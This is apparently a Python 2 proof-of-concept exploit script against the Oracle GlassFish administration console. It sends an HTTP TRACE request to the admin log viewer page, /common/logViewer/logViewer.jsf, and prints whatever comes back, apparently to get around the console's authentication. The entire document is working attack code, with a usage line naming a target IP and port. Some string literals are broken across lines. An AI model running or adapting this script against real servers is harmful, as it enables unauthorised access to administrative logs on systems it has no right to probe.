import sys
import httplib

def make_trace_request(host, port, selector):

    print '[*] TRACE request: %s' % selector
    headers = { 'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0;
Windows NT 5.1; Trident/4.0)',
                'Host': '%s:%s' % (host, port),
                'Accept':
'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-us,en;q=0.5',
                'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
                'Accept-Encoding': 'gzip,deflate',
                'Connection': 'close',
                'Referer': 'http://%s:%s%s' % (host, port, selector)}

    conn = httplib.HTTPConnection(host, port)
    conn.request('TRACE', selector, headers=headers)
    response = conn.getresponse()
    conn.close()

    print response.status, response.reason
    print response.getheaders()
    print response.read()



if len(sys.argv) != 3:
    print "Usage: $ python poc.py <GlassFish_IP>
<GlassFish_Administration_Port>\nE.g:   $ python poc.py 192.168.0.1 4848"
    sys.exit(0)

host = sys.argv[1]
port = int(sys.argv[2])
make_trace_request(host, port, '/common/logViewer/logViewer.jsf')